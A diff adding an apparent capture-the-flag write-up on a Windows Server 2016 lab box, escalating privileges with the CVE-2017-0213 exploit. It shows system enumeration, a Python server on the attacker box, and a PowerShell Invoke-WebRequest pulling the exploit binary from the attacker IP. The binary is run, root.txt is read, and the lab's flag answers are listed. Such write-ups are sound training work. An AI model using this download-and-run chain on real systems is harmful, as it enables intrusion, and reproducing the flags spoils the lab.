@@ -416,3 +416,213 @@ https://github.com/jas502n/CVE-2019-1388
 
 Microsoft Windows [Version 10.0.14393]
 (c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\Wade>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+However, after trying that exploit for a while, we understand that we are not able to get root privileges on the box (this is a personal experience, it may work for someone else). We decide to enumerate box further to find another way to escalate our privilege.
+
+Therefore, since the box is Microsoft Windows Server 2016 Standard and OS version is 10.0.14393 N/A Build 14393, we decide to google it to find another way for post-exploitation.
+
+Enumerating system information to find out more information about the operating system, its version/build and any hotfixes installed:
+
+C:\Users\Wade>systeminfo
+
+Host Name:                 RETROWEB
+OS Name:                   Microsoft Windows Server 2016 Standard
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00377-60000-00000-AA325
+Original Install Date:     12/8/2019, 10:50:43 PM
+System Boot Time:          9/28/2022, 10:14:11 AM
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
+BIOS Version:              Xen 4.11.amazon, 8/24/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     2,048 MB
+Available Physical Memory: 963 MB
+Virtual Memory: Max Size:  3,200 MB
+Virtual Memory: Available: 2,048 MB
+Virtual Memory: In Use:    1,152 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              \\RETROWEB
+Hotfix(s):                 1 Hotfix(s) Installed.
+                           [01]: KB3192137
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: AWS PV Network Device
+                                 Connection Name: Ethernet
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.10.0.1
+                                 IP address(es)
+                                 [01]: 10.10.106.113
+                                 [02]: fe80::6c44:ec5e:188e:4734
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+This specific build of Windows 10 is affected by a kernel exploit that allows for privilege escalation (2017-0213), as mentioned in PayloadAllTheThings:
+
+We find a CVE-2017-0213, and we decide to use this exploit to escalate our privilege on the box.
+
+The “Affected Products” section of the repository also confirms that the build the box is running is vulnerable:
+
+download it and pass to the Wade machine
+
+https://github.com/WindowsExploits/Exploits/blob/master/CVE-2017-0213/Binaries/CVE-2017-0213_x64.zip
+
+In order to download file to target box, we set up an Http server on our attacking box via python3 and we move .zip file to the location of the web server we set up.
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 -m http.server                 
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+Then on the target box, Google Chrome is installed, we open it and type our attacking box IP on the web browser and download it.
+
+so cannot pass it , using powershell
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ unzip CVE-2017-0213_x64.zip              
+Archive:  CVE-2017-0213_x64.zip
+  inflating: CVE-2017-0213_x64.exe
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 80  
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.106.113 - - [28/Sep/2022 14:17:28] "GET /CVE-2017-0213_x64.exe HTTP/1.1" 200 -
+
+PS C:\Users\Wade> Invoke-WebRequest -Uri http://10.11.81.220/CVE-2017-0213_x64.exe -OutFile CVE-2017-0213_x64.exe
+
+:)
+
+execute it
+
+PS C:\Users\Wade> .\CVE-2017-0213_x64.exe
+Building Library with path: script:C:\Users\Wade\run.sct
+Found TLB name at offset 766
+QI - Marshaller: {00000000-0000-0000-C000-000000000046} 000001EB48294AC
+Queried Success: 000001EB48294AC0
+AddRef: 1
+QI - Marshaller: {0000001B-0000-0000-C000-000000000046} 000001EB48294AC
+QI - Marshaller: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 000001EB48294AC
+QI - Marshaller: {00000000-0000-0000-C000-000000000046} 000001EB48294AC
+Queried Success: 000001EB48294AC0
+AddRef: 2
+QI - Marshaller: {00000018-0000-0000-C000-000000000046} 000001EB48294AC
+QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB48294AC
+QI - Marshaller: {00000040-0000-0000-C000-000000000046} 000001EB48294AC
+QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB48294AC
+QI - Marshaller: {94EA2B94-E9CC-49E0-C0FF-EE64CA8F5B90} 000001EB48294AC
+QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB48294AC
+QI - Marshaller: {77DD1250-139C-2BC3-BD95-900ACED61BE5} 000001EB48294AC
+QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB48294AC
+QI - Marshaller: {BFD60505-5A1F-4E41-88BA-A6FB07202DA9} 000001EB48294AC
+QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB48294AC
+QI - Marshaller: {03FB5C57-D534-45F5-A1F4-D39556983875} 000001EB48294AC
+QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB48294AC
+QI - Marshaller: {2C258AE7-50DC-49FF-9D1D-2ECB9A52CDD7} 000001EB48294AC
+QI - Marshaller: {00000019-0000-0000-C000-000000000046} 000001EB48294AC
+QI - Marshaller: {4C1E39E1-E3E3-4296-AA86-EC938D896E92} 000001EB48294AC
+Release: 3
+Opened Link \??\C: -> \Device\HarddiskVolume2\Users\Wade: 0000000000000
+QI - Marshaller: {00000003-0000-0000-C000-000000000046} 000001EB48294D2
+Queried Success: 000001EB48294D20
+AddRef: 1
+Release: 2
+QI - Marshaller: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 000001EB48294D2
+QI - Marshaller: {00000003-0000-0000-C000-000000000046} 000001EB48294D2
+Queried Success: 000001EB48294D20
+AddRef: 1
+Marshal Interface: {00000000-0000-0000-C000-000000000046}
+AddRef: 2
+AddRef: 3
+Release: 4
+Marshal Complete: 00000000
+Release: 2
+AddRef: 3
+QI - Marshaller: {00000003-0000-0000-C000-000000000046} 000001EB48294AC
+Queried Success: 000001EB48294AC0
+AddRef: 4
+Marshal Interface: {659CDEAC-489E-11D9-A9CD-000D56965251}
+Setting bad IID
+Unknown IID: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 000001EB482950A0
+Unknown IID: {00000003-0000-0000-C000-000000000046} 000001EB482950A0
+Unknown IID: {0000001B-0000-0000-C000-000000000046} 000001EB482950A0
+Query for IUnknown
+Unknown IID: {00000018-0000-0000-C000-000000000046} 000001EB482950A0
+Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB482950A0
+Unknown IID: {00000040-0000-0000-C000-000000000046} 000001EB482950A0
+Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB482950A0
+Unknown IID: {94EA2B94-E9CC-49E0-C0FF-EE64CA8F5B90} 000001EB482950A0
+Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB482950A0
+Unknown IID: {77DD1250-139C-2BC3-BD95-900ACED61BE5} 000001EB482950A0
+Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB482950A0
+Unknown IID: {BFD60505-5A1F-4E41-88BA-A6FB07202DA9} 000001EB482950A0
+Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB482950A0
+Unknown IID: {03FB5C57-D534-45F5-A1F4-D39556983875} 000001EB482950A0
+Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001EB482950A0
+Unknown IID: {2C258AE7-50DC-49FF-9D1D-2ECB9A52CDD7} 000001EB482950A0
+Unknown IID: {00000019-0000-0000-C000-000000000046} 000001EB482950A0
+Unknown IID: {4C1E39E1-E3E3-4296-AA86-EC938D896E92} 000001EB482950A0
+Query for ITMediaControl
+Marshal Complete: 00000000
+Release: 5
+Release: 4
+AddRef: 3
+Release: 4
+Release: 3
+Result: 80029C4A
+Done
+Release: 1
+Release object 000001EB48294D20
+Release: 2
+
+and get admin
+
+cannot copy 
+
+but open it with
+
+type C:\Users\Administrator\Desktop\root.txt.txt
+
+795f8b569565d7bd88d10c6f22d1c4063
+```
+A web server is running on the target. What is the hidden directory which the website lives on?
+dirbuster 2.3 medium
+*/retro*
+![[Pasted image 20220928122948.png]]
+![](https://media-exp1.licdn.com/dms/image/C4D12AQGzgWuI3N6_kA/article-inline_image-shrink_1000_1488/0/1624395483217?e=1669852800&v=beta&t=_mVz2JY475JIB4qVJBAAa-E62fyXCcafUW_ZRaIIzeA)
+![[Pasted image 20220928125228.png]]
+![](https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/07/image-62.png?w=1019&ssl=1)
+![](https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/07/image-54.png?w=690&ssl=1)
+![[Pasted image 20220928132126.png]]
+user.txt
+Don't leave sensitive information out in the open, even if you think you have control over it.
+*3b99fbdc6d430bfb51c72c651a261927*
+root.txt
+Figure out what the user last was trying to find. Otherwise, put this one on ice and get yourself a better shell, perhaps one dipped in venom.
+*795f8b569565d7bd88d10c6f22d1c4063*
+
+## Notes / Lessons Learned
+[[Internal]]
+
